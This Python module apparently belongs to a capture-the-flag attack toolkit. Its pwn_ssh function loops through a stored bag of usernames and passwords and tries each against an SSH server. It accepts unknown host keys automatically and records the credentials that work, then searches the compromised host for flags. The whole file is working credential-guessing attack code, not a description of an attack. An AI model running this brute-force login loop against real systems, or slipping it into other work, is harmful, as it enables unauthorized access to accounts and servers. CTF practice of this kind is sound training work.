from typing import Tuple

import paramiko

from .credentials import credential_bag, flag_bag
from .exploit import find_flags, FlagConf


def _get_ssh_client():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return ssh


def pwn_ssh(url: str, port: int, service, flag_conf: FlagConf) -> Tuple[str, bool, bool]:
    ssh = _get_ssh_client()

    working = set()
    for credential in credential_bag.credentials():
        try:
            with ssh:
                ssh.connect(url, port=port, username=credential.username, password=credential.password, look_for_keys=False)
                credential.mark_works(service)
                working.add(credential)

                flags = find_flags(ssh)
                for flag in flags:
                    flag_bag.add_flag(service, flag)
        except:
            credential.mark_rejected(service)
            continue

    if working:
        return "Found credentials: {}".format(working), True, False
    else:
        return 'Authentication failed', False, False


PWN_FUNCS = {
    'ssh': pwn_ssh,
}
